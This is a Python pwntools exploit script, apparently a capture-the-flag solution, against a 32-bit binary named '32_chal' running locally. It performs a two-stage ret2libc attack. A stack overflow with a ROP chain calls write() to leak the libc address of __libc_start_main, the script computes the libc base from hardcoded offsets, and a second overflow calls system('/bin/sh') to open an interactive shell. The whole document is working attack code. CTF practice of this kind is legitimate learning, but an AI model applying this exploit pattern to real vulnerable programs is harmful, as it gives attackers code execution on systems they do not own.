from pwn import *
import time

HOST = '127.0.0.1'
PORT = 4000

local = True

if local:
    conn = process("./32_chal", env={'LD_PRELOAD':'./libc.so.6'})
else:
    conn = remote(HOST, PORT)

elf = ELF("./32_chal")

context.log_level = 'debug'
gdb.attach(conn)

"""
$ nm -D ./libc.so.6 |grep main
00018540 T __libc_start_main

$ strings -a -t x libc.so.6 |grep /bin/sh
 15900b /bin/sh
"""
pop3ret = 0x804853d
main_addr = 0x804847d
__libc_start_main_rel = 0x00018540
system_rel = 0x0003a940
binsh_rel = 0x15900b

""" 1st RUN
"""

print conn.recvuntil("pwners, \n")

ROP = "A" * 112
# write(1, __libc_start_main_got, 4)
ROP += p32(elf.plt['write'])
ROP += p32(main_addr)
ROP += p32(1)
ROP += p32(elf.got['__libc_start_main'])
ROP += p32(4)

conn.sendline(ROP)
print conn.recv()

""" Calc libc_base
"""
__libc_start_main_addr = u32(conn.recv(4))
libc_base = __libc_start_main_addr - __libc_start_main_rel

system_addr = libc_base + system_rel
binsh_addr = libc_base + binsh_rel

print "libc_base:{}".format(hex(libc_base))

""" 2nd RUN
"""
print conn.recvuntil("pwners, \n")

ROP = "B" * 104
ROP += p32(system_addr)
ROP += "CCCC"
ROP += p32(binsh_addr)

conn.sendline(ROP)

# Last
conn.interactive()
